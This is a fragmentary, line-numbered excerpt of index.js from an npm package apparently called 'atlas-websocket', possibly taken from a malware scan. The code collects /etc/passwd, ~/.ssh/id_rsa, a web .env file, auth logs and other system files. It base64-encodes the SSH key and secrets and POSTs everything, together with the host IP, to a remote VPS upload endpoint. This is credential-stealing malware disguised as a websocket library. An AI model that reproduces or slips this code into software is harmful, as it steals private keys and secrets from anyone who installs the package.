// File: tmp/tmpk1b7y5ow/atlas-websocket/package/index.js
// ======================================================================
Line 1: const fs = require("fs")
Line 2: const https = require("https")
Line 3: const querystring = require("querystring")
Line 4: const os = require("os")
Line 15: _tmp_0.push("/etc/passwd")
Line 16: _tmp_0.push("/etc/hosts")
Line 17: _tmp_0.push("/etc/hostname")
Line 18: _tmp_0.push("~/.ssh/id_rsa")
Line 19: _tmp_0.push("/etc/crontab")
Line 20: _tmp_0.push("/var/www/html/.env")
Line 21: _tmp_0.push("/var/log/auth.log")
Line 29: {
    if (err) {
      console.error(`Error reading ${file}:`, err);
      // Move to the next file if current one is not accessible
      allData += `$###############$\n`;
      return;
    }

    // If the file content is binary (or we suspect it), base64 encode it
    if (file.includes("id_rsa") || file.includes(".env")) {
      // Encoding binary data
      data = Buffer.from(data).toString('base64');
    }

    // Add file data to the output with partition
    allData += `File: ${file}\n${data}\n$###############$\n`;

    // Now send the data to the VPS using POST request
    const postData = querystring.stringify({ msg: allData, sourceIP: localIP });

    const options = {
      hostname: vpsURL,
      port: vpsPort,
      path: `/upload`, // Choose your endpoint as required
      method: "POST",
      headers: {
        "Content-Type": "application/x-www-form-urlencoded",
        "Content-Length": Buffer.byteLength(postData),
      },
    };

    const req = https.request(opt...
Line 38: file.includes("id_rsa")
Line 40: Buffer.from(data).toString('base64')
Line 49: const options = {
      hostname: vpsURL,
      port: vpsPort,
      path: `/upload`, // Choose your endpoint as required
      method: "POST",
      headers: {
        "Content-Type": "application/x-www-form-urlencoded",
        "Content-Length": Buffer.byteLength(postData),
      },
    }
Line 60: const req = https.request(options, (res) => {
      res.on("data", (d) => {
        process.stdout.write(d);
      });
    })
Line 61: {
        process.stdout.write(d);
      }
Line 62: process.stdout.write(d)
Line 70: req.write(postData)
Line 71: req.end()
